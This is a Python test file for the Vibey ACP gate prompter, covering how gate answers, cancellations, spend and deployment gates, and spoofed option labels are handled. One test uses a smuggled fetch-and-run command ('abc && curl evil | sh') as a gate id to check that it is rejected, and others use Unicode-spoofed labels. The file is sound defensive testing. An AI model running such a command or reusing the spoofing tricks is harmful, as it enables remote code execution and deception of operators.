# Made with ❤️ by [Vibey](https://the-vibey-project.github.io/vibey/), Developed by [Adam Matthew Steinberger](https://vibewithadam.matthewsteinberger.com/) ([@adammatthewsteinberger](https://github.com/adammatthewsteinberger/)).
"""Open gates put to an ACP client as permission requests, after a prompt turn's hub reply.

An answerable gate is asked once per session; the operator's pick answers it through the hub
as the scoped agent principal. A spend gate is never asked: the operator is told to answer it
on the host. A cancelled, timed-out, unknown or "leave it open" answer is never an approval.
Also: a gate answered by number (`/answer 1`, a bare `1`) means here what it means at the hub.

Module-level test functions rather than a class with an interface beside it (ADR-0016)."""

from __future__ import annotations

import asyncio
import json
from typing import Any

import pytest
from acp.schema import RequestPermissionRequest, SessionNotification
from acp_fakes import (
    FakeChannel,
    FakeHub,
    build_agent,
    build_gates,
    build_turn,
    context,
    next_turn,
    text,
    until,
)

from tests.domain.acp.acp_wire import assert_wire_exact
from vibey.application.acp.dto import HubToolResult, HubTurn
from vibey.application.acp.interfaces.acp_gate_prompter_interface import (
    AcpGatePrompterInterface,
)
from vibey.domain.acp.settings import AcpSettings
from vibey.domain.hub_chat import HUB_CHAT
from vibey.domain.hub_scope import DEPLOYMENT_OPT_IN_OPTIONS, DEPLOYMENT_OPT_IN_PROMPT, HubScope
from vibey.infrastructure.acp.peer_client_channel import PeerClientChannel
from vibey.infrastructure.jsonrpc.codec import CODEC
from vibey.infrastructure.jsonrpc.peer import JsonRpcPeer
from vibey.infrastructure.mcp.hub_gateway import HubGatewayError

PROJECT = "7d6c2a8e-0c41-4c1e-9d0e-2f4b8f0a1b2c"
G = "3f1d2c4b-5a6e-4f70-8a9b-0c1d2e3f4a5b"
G2 = "4a2e3d5c-6b7f-4081-9bac-1d2e3f4a5b6c"
G3 = "5b3f4e6d-7c80-4192-acbd-2e3f4a5b6c7d"
LEFT_OPEN = "left open; nothing was answered"


def gate(
    gate_id: str = G, kind: str = "choice", options: list[str] | None = None
) -> dict[str, Any]:
    """A gate as the hub lists it with a chat turn (`HubChat.format_gate_prompt`)."""
    return HUB_CHAT.format_gate_prompt(
        {
            "gate_id": gate_id,
            "project_id": PROJECT,
            "kind": kind,
            "prompt": "Ship it?",
            "options": ["yes", "no"] if options is None else options,
            "default_answer": None,
        }
    )


def gates_turn(*gates: dict[str, Any]) -> HubTurn:
    return HubTurn(
        reply=f"{len(gates)} open gate(s)",
        tool_calls=({"name": "vibey_gates", "arguments": {}, "result": list(gates)},),
        gates=tuple(gates),
        project_id=None,
    )


def gate_updates(channel: FakeChannel, gate_id: str = G) -> list[dict[str, Any]]:
    return [u for u in channel.updates if str(u.get("toolCallId", "")).endswith(gate_id)]


def last_text(update: dict[str, Any]) -> str:
    content: str = update["content"][0]["content"]["text"]
    return content


async def run_gates(
    channel: FakeChannel,
    hub: FakeHub,
    *gates: dict[str, Any],
    settings: AcpSettings | None = None,
    mode_id: str = "drive",
) -> Any:
    hub.turn = gates_turn(*gates)
    session = context(mode_id=mode_id)
    await build_turn(channel, hub, settings=settings).run(session, [text("/gates")], turn_id="t1")
    return session


def test_the_prompter_satisfies_its_interface() -> None:
    assert isinstance(build_gates(FakeChannel(), FakeHub()), AcpGatePrompterInterface)


# -- answering ----------------------------------------------------------------------------


async def test_selected_allow_answers_the_gate_with_its_parsed_answer() -> None:
    channel, hub = FakeChannel(), FakeHub()
    channel.permission_answers = [f"{G}:0"]

    session = await run_gates(channel, hub, gate())

    assert hub.tool_calls == [
        ("vibey_answer_gate", {"gate_id": G, "answer": {"choice": "yes"}}, f"acp-s-{G}")
    ]
    asked = channel.permission_requests[0]
    call_id = f"t1-gate-{G}"
    assert asked["tool_call"] == {"toolCallId": call_id}
    assert asked["timeout"] == AcpSettings().permission_timeout_seconds
    assert asked["options"] == [
        {"optionId": f"{G}:0", "name": "Answer: yes", "kind": "allow_once"},
        {"optionId": f"{G}:1", "name": "Answer: no", "kind": "reject_once"},
        {"optionId": f"{G}:open", "name": "Leave it open", "kind": "reject_once"},
    ]
    assert_wire_exact(
        RequestPermissionRequest,
        {"sessionId": "s", "toolCall": asked["tool_call"], "options": asked["options"]},
    )
    updates = gate_updates(channel)
    assert [(u["sessionUpdate"], u["status"]) for u in updates] == [
        ("tool_call", "pending"),
        ("tool_call_update", "in_progress"),
        ("tool_call_update", "completed"),
    ]
    assert updates[0]["title"] == "Answer gate: Ship it?"
    assert updates[0]["kind"] == "other"
    assert updates[0]["rawInput"] == {"gate_id": G, "kind": "choice", "prompt": "Ship it?"}
    assert json.loads(last_text(updates[-1])) == {"answered": True}
    for update in channel.updates:
        assert_wire_exact(SessionNotification, {"sessionId": "s", "update": update})
    assert session.offered_gates == {G}
    assert session.open_gates == ()


async def test_the_gate_phase_runs_after_the_hubs_reply() -> None:
    channel, hub = FakeChannel(), FakeHub()

    await run_gates(channel, hub, gate())

    kinds = [(u["sessionUpdate"], u.get("toolCallId")) for u in channel.updates]
    assert kinds == [
        ("tool_call", "t1-1"),
        ("tool_call_update", "t1-1"),
        ("tool_call_update", "t1-1"),
        ("agent_message_chunk", None),
        ("tool_call", f"t1-gate-{G}"),
        ("tool_call_update", f"t1-gate-{G}"),
    ]


async def test_a_reject_option_answers_the_gate_with_the_rejection() -> None:
    channel, hub = FakeChannel(), FakeHub()
    channel.permission_answers = [f"{G}:1"]

    await run_gates(channel, hub, gate())

    assert hub.tool_calls == [
        ("vibey_answer_gate", {"gate_id": G, "answer": {"choice": "no"}}, f"acp-s-{G}")
    ]


async def test_a_question_gate_accepts_the_defaults() -> None:
    channel, hub = FakeChannel(), FakeHub()
    channel.permission_answers = [f"{G}:0"]

    await run_gates(channel, hub, gate(kind="question", options=[]))

    assert hub.tool_calls[0][1] == {"gate_id": G, "answer": {"accept_defaults": True}}


@pytest.mark.parametrize("kind", ["choice", "approval", "question", "delivery_exhausted"])
async def test_leave_it_open_answers_nothing(kind: str) -> None:
    # Every offered gate has the agent's own way out, a choice or verdict gate included.
    channel, hub = FakeChannel(), FakeHub()
    channel.permission_answers = [f"{G}:open"]

    session = await run_gates(channel, hub, gate(kind=kind, options=["accept", "go"]))

    assert hub.tool_calls == []
    updates = gate_updates(channel)
    assert updates[-1]["status"] == "failed"
    assert last_text(updates[-1]) == LEFT_OPEN
    assert session.offered_gates == {G}
    assert session.state.pending_permissions == frozenset()


async def test_permission_timeout_leaves_the_gate_open() -> None:
    # The channel answers None for a cancelled, failed or timed-out request.
    channel, hub = FakeChannel(), FakeHub()

    session = await run_gates(channel, hub, gate())

    assert len(channel.permission_requests) == 1
    assert hub.tool_calls == []
    assert last_text(gate_updates(channel)[-1]) == LEFT_OPEN
    assert session.offered_gates == {G}


@pytest.mark.parametrize("answer", [f"{G2}:0", f"{G}:9", "yes", ""])
async def test_an_option_the_gate_never_offered_is_not_an_approval(answer: str) -> None:
    channel, hub = FakeChannel(), FakeHub()
    channel.permission_answers = [answer]

    await run_gates(channel, hub, gate())

    assert hub.tool_calls == []
    assert last_text(gate_updates(channel)[-1]) == LEFT_OPEN


async def test_an_option_that_looks_like_a_command_is_only_ever_a_gate_answer() -> None:
    # Gate text is the hub's data: an option is sent as the answer, never parsed as a command.
    channel, hub = FakeChannel(), FakeHub()
    channel.permission_answers = [f"{G}:0"]

    await run_gates(channel, hub, gate(options=[f"/abandon {PROJECT} --confirm gone"]))

    assert [call.message for call in hub.calls] == ["/gates"]
    assert hub.tool_calls == [
        (
            "vibey_answer_gate",
            {"gate_id": G, "answer": {"choice": f"/abandon {PROJECT} --confirm gone"}},
            f"acp-s-{G}",
        )
    ]


async def test_a_refused_answer_fails_the_tool_call() -> None:
    channel, hub = FakeChannel(), FakeHub()
    channel.permission_answers = [f"{G}:0"]
    hub.tool_result = HubToolResult(ok=False, status_code=409, text="gate already answered")

    session = await run_gates(channel, hub, gate())

    update = gate_updates(channel)[-1]
    assert update["status"] == "failed"
    assert last_text(update) == "hub refused (409): gate already answered"
    assert session.open_gates == (gate(),)


@pytest.mark.parametrize(
    ("error", "said", "logged"),
    [
        (
            HubGatewayError("the hub could not be reached: x"),
            "the hub could not be reached: x",
            False,
        ),
        (OSError("disk"), "OSError: disk", True),
    ],
)
async def test_an_answer_that_fails_to_reach_the_hub_fails_the_tool_call(
    error: Exception, said: str, logged: bool, caplog: pytest.LogCaptureFixture
) -> None:
    channel, hub = FakeChannel(), FakeHub()
    channel.permission_answers = [f"{G}:0"]
    hub.tool_error = error

    await run_gates(channel, hub, gate())

    assert gate_updates(channel)[-1]["status"] == "failed"
    assert last_text(gate_updates(channel)[-1]) == said
    assert ("Traceback" in caplog.text) is logged  # only a defect's traceback is logged


async def test_a_long_answer_result_is_truncated() -> None:
    channel, hub = FakeChannel(), FakeHub()
    channel.permission_answers = [f"{G}:0"]
    hub.tool_result = HubToolResult(ok=True, status_code=200, text="x" * 500)
    hub.turn = gates_turn(gate())

    await build_turn(channel, hub, max_result_chars=100).run(
        context(), [text("/gates")], turn_id="t1"
    )

    assert last_text(gate_updates(channel)[-1]) == "x" * 100 + "\n...[truncated 400 chars]"


# -- what is never asked ------------------------------------------------------------------


@pytest.mark.parametrize("kind", ["budget_exhausted", "deploy_interview", "deploy_demo_review"])
async def test_spend_gate_in_a_turn_sends_no_permission_request(kind: str) -> None:
    channel, hub = FakeChannel(), FakeHub()

    session = await run_gates(channel, hub, gate(kind=kind, options=["approve", "accept"]))

    assert channel.permission_requests == [] and "on the host" in channel.texts[-1]
    assert channel.texts[-1] == (
        f"Gate {G} ({kind}) spends money, so I cannot answer it. Answer it on the host "
        f"(`vibey answer {G}`) or in the desktop or mobile app."
    )
    assert hub.tool_calls == []
    assert session.offered_gates == {G}


async def test_a_gate_flagged_spend_is_never_asked_whatever_its_kind() -> None:
    channel, hub = FakeChannel(), FakeHub()

    await run_gates(channel, hub, {**gate(), "is_spend": True})

    assert channel.permission_requests == []
    assert hub.tool_calls == []


async def test_a_value_gate_is_explained_not_asked() -> None:
    channel, hub = FakeChannel(), FakeHub()

    await run_gates(channel, hub, gate(kind="attempts_exhausted", options=[]))

    assert channel.permission_requests == []
    assert (
        channel.texts[-1]
        == f"Gate {G} (attempts_exhausted) needs a value. Answer it with `/answer {G} <value>`."
    )


async def test_observe_mode_never_offers_a_gate() -> None:
    channel, hub = FakeChannel(), FakeHub()

    session = await run_gates(channel, hub, gate(), gate(G2, "budget_exhausted"), mode_id="observe")

    assert channel.permission_requests == []
    assert hub.tool_calls == []
    assert channel.texts == ["2 open gate(s)"]
    assert session.offered_gates == set()  # offered once the session can answer them


async def test_a_hub_that_does_not_grant_answer_never_offers_a_gate() -> None:
    channel = FakeChannel()
    hub = FakeHub(scopes=frozenset({HubScope.VIEW, HubScope.RUN}))

    await run_gates(channel, hub, gate())

    assert channel.permission_requests == []
    assert hub.tool_calls == []


# -- how many, how often ------------------------------------------------------------------


async def test_a_gate_is_offered_once_per_session() -> None:
    channel, hub = FakeChannel(), FakeHub(gates_turn(gate(), gate(G2, "budget_exhausted")))
    session = context()
    turn = build_turn(channel, hub)

    await turn.run(session, [text("/gates")], turn_id="t1")
    await build_turn(channel, hub).run(next_turn(session, "t2"), [text("/gates")], turn_id="t2")

    assert len(channel.permission_requests) == 1
    assert sum("spends money" in said for said in channel.texts) == 1
    assert session.offered_gates == {G, G2}


async def test_at_most_max_gate_prompts_per_turn() -> None:
    channel, hub = FakeChannel(), FakeHub(gates_turn(gate(), gate(G2), gate(G3)))
    settings = AcpSettings(max_gate_prompts_per_turn=2)
    session = context()

    await build_turn(channel, hub, settings=settings).run(session, [text("/gates")], turn_id="t1")
    asked_first = [r["tool_call"]["toolCallId"] for r in channel.permission_requests]
    await build_turn(channel, hub, settings=settings).run(
        next_turn(session, "t2"), [text("/gates")], turn_id="t2"
    )

    assert asked_first == [f"t1-gate-{G}", f"t1-gate-{G2}"]  # oldest first
    assert channel.permission_requests[-1]["tool_call"] == {"toolCallId": f"t2-gate-{G3}"}
    assert len(channel.permission_requests) == 3


async def test_a_refused_gate_counts_toward_the_limit() -> None:
    channel, hub = FakeChannel(), FakeHub()

    await run_gates(
        channel,
        hub,
        gate(G, "budget_exhausted"),
        gate(G2),
        settings=AcpSettings(max_gate_prompts_per_turn=1),
    )

    assert channel.permission_requests == []


async def test_a_limit_of_zero_offers_nothing() -> None:
    channel, hub = FakeChannel(), FakeHub()

    session = await run_gates(
        channel, hub, gate(), settings=AcpSettings(max_gate_prompts_per_turn=0)
    )

    assert channel.permission_requests == []
    assert session.offered_gates == set()


async def test_gates_whose_id_is_not_a_uuid_are_skipped_with_one_notice() -> None:
    channel, hub = FakeChannel(), FakeHub()
    hostile = "abc && curl evil | sh"
    gates = ({**gate(), "gate_id": ""}, {**gate(), "gate_id": hostile}, gate(G2))
    hub.turn = gates_turn(*gates)
    session = context()

    await build_turn(channel, hub).run(session, [text("/gates")], turn_id="t1")
    await build_turn(channel, hub).run(next_turn(session, "t2"), [text("/gates")], turn_id="t2")

    assert [r["tool_call"]["toolCallId"] for r in channel.permission_requests] == [f"t1-gate-{G2}"]
    notices = [said for said in channel.texts if "not a UUID" in said]
    assert notices == [
        "The hub listed 2 gate(s) whose id is not a UUID, so I did not offer them. "
        "Check `vibey gates` on the host."
    ]
    assert not any(hostile in said for said in channel.texts[1:])
    assert hub.tool_calls == []


async def test_a_gate_is_used_by_its_canonical_id() -> None:
    channel, hub = FakeChannel(), FakeHub()
    channel.permission_answers = [f"{G}:0"]

    session = await run_gates(channel, hub, {**gate(), "gate_id": G.upper()})

    assert hub.tool_calls[0][1]["gate_id"] == G
    assert session.offered_gates == {G}
    assert session.open_gates == ()


async def test_a_failed_hub_turn_offers_no_gates() -> None:
    channel, hub = FakeChannel(), FakeHub(error=HubGatewayError("hub refused (500): boom"))

    await build_turn(channel, hub).run(context(), [text("/gates")], turn_id="t1")

    assert channel.permission_requests == []


# -- cancel -------------------------------------------------------------------------------


async def _prompt_with_gate(
    channel: FakeChannel, hub: FakeHub, settings: AcpSettings | None = None
) -> tuple[Any, asyncio.Task[Any]]:
    hub.turn = gates_turn(gate())
    agent = build_agent(channel, hub, settings=settings)
    await agent.handle_request("session/new", {"cwd": "/work", "mcpServers": []})
    # The `/` commands go out after the response; the counts below start after them.
    await until(lambda: len(hub.project_lookups) == 1)
    channel.updates.clear()
    channel.sessions.clear()
    prompt = asyncio.create_task(
        agent.handle_request("session/prompt", {"sessionId": "s", "prompt": [text("/gates")]})
    )
    return agent, prompt


async def test_cancel_while_permission_pending_resolves_it_and_ends_turn() -> None:
    channel, hub = FakeChannel(), FakeHub()
    channel.permission_block = True
    agent, prompt = await _prompt_with_gate(channel, hub)
    await asyncio.wait_for(channel.permission_asked.wait(), 5)
    assert agent.sessions["s"].pending_permissions == frozenset({f"t1-gate-{G}"})

    await agent.handle_notification("session/cancel", {"sessionId": "s"})
    result = await asyncio.wait_for(prompt, 5)

    assert result == {"stopReason": "cancelled"}
    assert agent.sessions["s"].pending_permissions == frozenset()
    assert channel.cancelled_permissions == ["s"]
    assert hub.tool_calls == []
    assert gate_updates(channel)[-1]["status"] == "failed"
    assert last_text(gate_updates(channel)[-1]) == LEFT_OPEN


async def test_a_cancel_with_no_permission_out_cancels_none() -> None:
    channel, hub = FakeChannel(), FakeHub()
    hub.release = asyncio.Event()
    agent, prompt = await _prompt_with_gate(channel, hub)
    await asyncio.wait_for(hub.entered.wait(), 5)

    await agent.handle_notification("session/cancel", {"sessionId": "s"})
    hub.release.set()
    await asyncio.wait_for(prompt, 5)

    assert channel.cancelled_permissions == []
    assert channel.permission_requests == []


async def test_cancel_while_the_answer_is_in_flight_reports_the_real_outcome_within_grace() -> None:
    channel, hub = FakeChannel(), FakeHub()
    channel.permission_answers = [f"{G}:0"]
    hub.tool_release = asyncio.Event()
    agent, prompt = await _prompt_with_gate(channel, hub, AcpSettings(cancel_grace_seconds=5.0))
    await asyncio.wait_for(hub.tool_entered.wait(), 5)

    await agent.handle_notification("session/cancel", {"sessionId": "s"})
    await asyncio.sleep(0.05)
    hub.tool_release.set()
    result = await asyncio.wait_for(prompt, 5)

    assert result == {"stopReason": "cancelled"}
    assert gate_updates(channel)[-1]["status"] == "completed"
    assert len(gate_updates(channel)) == 3
    assert agent._contexts["s"].open_gates == ()  # answered: dropped from the local view


async def test_cancel_while_the_answer_is_in_flight_reports_a_failure_within_grace() -> None:
    channel, hub = FakeChannel(), FakeHub()
    channel.permission_answers = [f"{G}:0"]
    hub.tool_release = asyncio.Event()
    hub.tool_error = OSError("gone")
    agent, prompt = await _prompt_with_gate(channel, hub, AcpSettings(cancel_grace_seconds=5.0))
    await asyncio.wait_for(hub.tool_entered.wait(), 5)

    await agent.handle_notification("session/cancel", {"sessionId": "s"})
    await asyncio.sleep(0.05)
    hub.tool_release.set()
    await asyncio.wait_for(prompt, 5)

    assert last_text(gate_updates(channel)[-1]) == "OSError: gone"


async def test_cancel_after_grace_says_the_hub_may_still_apply_the_answer() -> None:
    channel, hub = FakeChannel(), FakeHub()
    channel.permission_answers = [f"{G}:0"]
    hub.tool_release = asyncio.Event()
    agent, prompt = await _prompt_with_gate(channel, hub, AcpSettings(cancel_grace_seconds=0.05))
    await asyncio.wait_for(hub.tool_entered.wait(), 5)

    await agent.handle_notification("session/cancel", {"sessionId": "s"})
    result = await asyncio.wait_for(prompt, 5)

    assert result == {"stopReason": "cancelled"}
    assert gate_updates(channel)[-1]["status"] == "failed"
    assert last_text(gate_updates(channel)[-1]) == (
        f"cancelled before the hub answered; the hub may still apply it (request id acp-s-{G})"
    )
    hub.tool_release.set()
    await asyncio.sleep(0.01)


async def test_cancel_while_the_gate_frame_is_written_still_closes_it() -> None:
    channel, hub = FakeChannel(), FakeHub()
    agent, prompt = await _prompt_with_gate(channel, hub)
    # 3 hub-call updates and the reply, then the gate's pending frame is number 5.
    held = asyncio.Event()
    channel.hold_at[5] = held
    await until(lambda: len(channel.updates) == 5)

    await agent.handle_notification("session/cancel", {"sessionId": "s"})
    await asyncio.sleep(0)
    held.set()
    result = await asyncio.wait_for(prompt, 5)

    assert result == {"stopReason": "cancelled"}
    assert [u["status"] for u in gate_updates(channel)] == ["pending", "failed"]
    assert last_text(gate_updates(channel)[-1]) == LEFT_OPEN
    assert channel.permission_requests == []


async def test_cancel_after_the_gate_was_closed_reports_nothing_twice() -> None:
    channel, hub = FakeChannel(), FakeHub()
    agent, prompt = await _prompt_with_gate(channel, hub)
    # The gate's pending, then its "left open" close (number 6) is held while a cancel lands.
    held = asyncio.Event()
    channel.hold_at[6] = held
    await until(lambda: len(channel.updates) == 6)

    await agent.handle_notification("session/cancel", {"sessionId": "s"})
    await asyncio.sleep(0)
    held.set()
    await asyncio.wait_for(prompt, 5)

    assert [u["status"] for u in gate_updates(channel)] == ["pending", "failed"]


async def test_a_client_that_never_answers_cannot_hold_a_cancelled_turn_over_the_wire() -> None:
    # Real peer, real channel: the permission request goes out on the wire and the client
    # never answers it; a `session/cancel` still ends the turn, and nothing is answered.
    hub = FakeHub(gates_turn(gate()))
    reader = asyncio.StreamReader()
    lines: list[dict[str, Any]] = []

    async def write(line: str) -> None:
        lines.append(json.loads(line))

    channel = PeerClientChannel()
    agent = build_agent(channel, hub)  # type: ignore[arg-type]
    peer = JsonRpcPeer(
        reader,
        write,
        on_request=agent.handle_request,
        on_notification=agent.handle_notification,
        codec=CODEC,
        eof_grace_seconds=5.0,
    )
    channel.attach(peer)
    serving = asyncio.create_task(peer.run())

    def send(message: dict[str, Any]) -> None:
        reader.feed_data((json.dumps({"jsonrpc": "2.0", **message}) + "\n").encode())

    def response(msg_id: int) -> dict[str, Any] | None:
        return next((m for m in lines if m.get("id") == msg_id and "method" not in m), None)

    send({"id": 1, "method": "session/new", "params": {"cwd": "/work", "mcpServers": []}})
    await until(lambda: response(1) is not None)
    send(
        {
            "id": 2,
            "method": "session/prompt",
            "params": {"sessionId": "s", "prompt": [text("/gates")]},
        }
    )
    await until(lambda: any(m.get("method") == "session/request_permission" for m in lines), 5000)
    asked = next(m for m in lines if m.get("method") == "session/request_permission")
    assert_wire_exact(RequestPermissionRequest, asked["params"])

    send({"method": "session/cancel", "params": {"sessionId": "s"}})
    await until(lambda: response(2) is not None, 5000)
    reader.feed_eof()
    await asyncio.wait_for(serving, 10)

    assert response(2) == {"jsonrpc": "2.0", "id": 2, "result": {"stopReason": "cancelled"}}
    assert hub.tool_calls == []
    closes = [
        m["params"]["update"]
        for m in lines
        if m.get("method") == "session/update"
        and m["params"]["update"].get("toolCallId") == f"t1-gate-{G}"
    ]
    assert closes[-1]["status"] == "failed"


# -- answering by number (review B-5) -----------------------------------------------------


async def test_the_hubs_gates_become_the_sessions_open_gates() -> None:
    channel, hub = FakeChannel(), FakeHub()

    session = await run_gates(channel, hub, gate(), gate(G2))

    assert session.open_gates == (gate(), gate(G2))


async def test_answer_by_number_reaches_the_hub_once_the_session_knows_the_gate() -> None:
    channel, hub = FakeChannel(), FakeHub()
    session = await run_gates(channel, hub, gate())  # the gate is listed, then left open
    hub.turn = HubTurn(
        reply=f"Answered gate {G}.",
        tool_calls=({"name": "vibey_answer_gate", "arguments": {}, "result": {"gate_id": G}},),
        gates=(),
        project_id=None,
    )
    before = len(channel.updates)

    await build_turn(channel, hub).run(next_turn(session, "t2"), [text("/answer 1")], turn_id="t2")

    assert [call.message for call in hub.calls] == ["/gates", "/answer 1"]
    start = channel.updates[before]
    assert (start["title"], start["kind"]) == ("Answer a gate", "other")
    assert "title" not in channel.updates[before + 2]
    assert session.open_gates == ()


async def test_answer_by_number_with_no_known_gate_is_still_refused_locally() -> None:
    channel, hub = FakeChannel(), FakeHub()

    await build_turn(channel, hub).run(context(), [text("/answer 1")], turn_id="t1")

    assert hub.calls == []
    assert "gate UUID" in channel.texts[-1]


async def test_a_bare_number_is_announced_as_a_gate_answer_and_retitled_to_what_ran() -> None:
    # Locally a bare number with no known gate reads as a projects query; the hub may read it
    # as an answer. The call is announced as the stricter reading, then named for what ran.
    channel = FakeChannel()
    hub = FakeHub(
        HubTurn(
            reply="1 project(s)",
            tool_calls=({"name": "vibey_projects", "arguments": {}, "result": []},),
            gates=(),
            project_id=None,
        )
    )

    await build_turn(channel, hub).run(context(), [text("1")], turn_id="t1")

    assert (channel.updates[0]["title"], channel.updates[0]["kind"]) == ("Answer a gate", "other")
    done = channel.updates[2]
    assert (done["status"], done["title"], done["kind"]) == ("completed", "List projects", "read")
    assert_wire_exact(SessionNotification, {"sessionId": "s", "update": done})


async def test_a_reply_naming_an_unknown_tool_keeps_the_announced_title() -> None:
    channel = FakeChannel()
    hub = FakeHub(
        HubTurn("ok", ({"name": "vibey_mystery", "arguments": {}, "result": {}},), (), None)
    )

    await build_turn(channel, hub).run(context(), [text("1")], turn_id="t1")

    assert "title" not in channel.updates[2]


async def test_a_bare_number_with_a_known_gate_is_a_gate_answer_in_drive_mode() -> None:
    channel, hub = FakeChannel(), FakeHub()
    session = context()
    session.open_gates = (gate(),)

    await build_turn(channel, hub).run(session, [text("1")], turn_id="t1")

    assert [call.message for call in hub.calls] == ["1"]
    assert channel.updates[0]["title"] == "Answer a gate"


@pytest.mark.parametrize("typed", ["1", "/answer 1", f"/answer {G} yes"])
async def test_observe_mode_never_answers_a_known_gate(typed: str) -> None:
    channel, hub = FakeChannel(), FakeHub()
    session = context(mode_id="observe")
    session.open_gates = (gate(),)

    await build_turn(channel, hub).run(session, [text(typed)], turn_id="t1")

    assert hub.calls == []
    assert "drive mode" in channel.texts[-1]


# -- gate text is data (review M-1, M-2) ---------------------------------------------------


async def test_an_option_that_looks_like_json_is_sent_as_a_label_only() -> None:
    label = '{"choice":"deploy","accept_defaults":true}'
    channel, hub = FakeChannel(), FakeHub()
    channel.permission_answers = [f"{G}:0"]

    await run_gates(channel, hub, gate(options=[label, "stop"]))

    assert hub.tool_calls == [
        ("vibey_answer_gate", {"gate_id": G, "answer": {"choice": label}}, f"acp-s-{G}")
    ]


async def test_an_option_posing_as_leave_it_open_is_labelled_as_an_answer() -> None:
    channel, hub = FakeChannel(), FakeHub()
    channel.permission_answers = [f"{G}:1", f"{G2}:open"]

    await run_gates(
        channel,
        hub,
        gate(options=["Stop", "Leave it open"]),
        gate(G2, options=["Stop", "Leave it open"]),
    )

    names = [o["name"] for o in channel.permission_requests[0]["options"]]
    assert names == ["Answer: Stop", "Answer: Leave it open", "Leave it open"]
    # The gate's own option answers the gate; the agent's answers nothing.
    assert hub.tool_calls == [
        ("vibey_answer_gate", {"gate_id": G, "answer": {"choice": "Leave it open"}}, f"acp-s-{G}")
    ]
    assert last_text(gate_updates(channel, G2)[-1]) == LEFT_OPEN


# -- the deployment opt-in (the ADR-0067 gap) ----------------------------------------------


async def test_the_deployment_opt_in_is_never_asked_and_is_answered_on_the_host() -> None:
    # As `review.deployment_choice` raises it: a plain `choice` gate. One click would opt the
    # project into provisioning real infrastructure, so it is refused like a spend gate.
    channel, hub = FakeChannel(), FakeHub()
    opt_in = {**gate(options=list(DEPLOYMENT_OPT_IN_OPTIONS)), "prompt": DEPLOYMENT_OPT_IN_PROMPT}
    assert opt_in["kind"] == "choice" and opt_in["is_spend"] is False

    session = await run_gates(channel, hub, opt_in)

    assert channel.permission_requests == []
    assert hub.tool_calls == []
    assert channel.texts[-1] == (
        f"Gate {G} (choice) opts the project into deployment, which can provision real "
        f"infrastructure, so I cannot answer it. Answer it on the host (`vibey answer {G}`) "
        "or in the desktop or mobile app."
    )
    assert session.offered_gates == {G}


# -- a cancel never drops a close (review S-3) ---------------------------------------------


async def test_a_cancel_while_the_close_waits_to_be_written_still_sends_it_once() -> None:
    channel, hub = FakeChannel(), FakeHub()
    agent, prompt = await _prompt_with_gate(channel, hub)
    # The gate's "left open" close (update 6) waits for the write before it is recorded.
    held = asyncio.Event()
    channel.hold_before[6] = held
    await asyncio.wait_for(channel.write_waiting.wait(), 5)

    await agent.handle_notification("session/cancel", {"sessionId": "s"})
    await asyncio.sleep(0)
    held.set()
    result = await asyncio.wait_for(prompt, 5)

    assert result == {"stopReason": "cancelled"}
    assert [u["status"] for u in gate_updates(channel)] == ["pending", "failed"]
    assert last_text(gate_updates(channel)[-1]) == LEFT_OPEN


async def test_a_cancel_while_the_answer_close_waits_to_be_written_still_sends_it() -> None:
    channel, hub = FakeChannel(), FakeHub()
    channel.permission_answers = [f"{G}:0"]
    agent, prompt = await _prompt_with_gate(channel, hub)
    # pending (5), in_progress (6), then the completed close (7) waits for its write.
    held = asyncio.Event()
    channel.hold_before[7] = held
    await asyncio.wait_for(channel.write_waiting.wait(), 5)

    await agent.handle_notification("session/cancel", {"sessionId": "s"})
    await asyncio.sleep(0)
    held.set()
    await asyncio.wait_for(prompt, 5)

    assert [u["status"] for u in gate_updates(channel)] == ["pending", "in_progress", "completed"]


async def test_a_gate_whose_options_hide_what_they_send_is_refused_to_the_host_once() -> None:
    # Review MR3-1: "s<ZWSP>top" would show as "stop" and hide the genuine "stop"; the whole
    # gate goes to the host, once per session, and nothing reaches the hub.
    channel, hub = FakeChannel(), FakeHub(gates_turn(gate(options=["s​top", "stop"])))
    session = context()

    await build_turn(channel, hub).run(session, [text("/gates")], turn_id="t1")
    await build_turn(channel, hub).run(next_turn(session, "t2"), [text("/gates")], turn_id="t2")

    assert channel.permission_requests == []
    assert hub.tool_calls == []
    refusals = [said for said in channel.texts if "cannot show unambiguously" in said]
    assert refusals == [
        f"Gate {G} (choice) has options I cannot show unambiguously (unusual or hidden "
        "characters, irregular spacing, mixed scripts, or labels that read alike), so I cannot "
        f"offer it. Answer it on the host (`vibey answer {G}`) or in the desktop or mobile app."
    ]
    assert session.offered_gates == {G}


@pytest.mark.parametrize(
    "label",
    ["כן", "نعم", "‮good", "go עכשיו"],
    ids=["Hebrew", "Arabic", "RLO", "mixed"],
)
async def test_a_right_to_left_label_sends_the_gate_to_the_host(label: str) -> None:
    channel, hub = FakeChannel(), FakeHub()

    session = await run_gates(channel, hub, gate(options=["stop", label]))

    assert channel.permission_requests == []
    assert hub.tool_calls == []
    assert "cannot show unambiguously" in channel.texts[-1]
    assert session.offered_gates == {G}
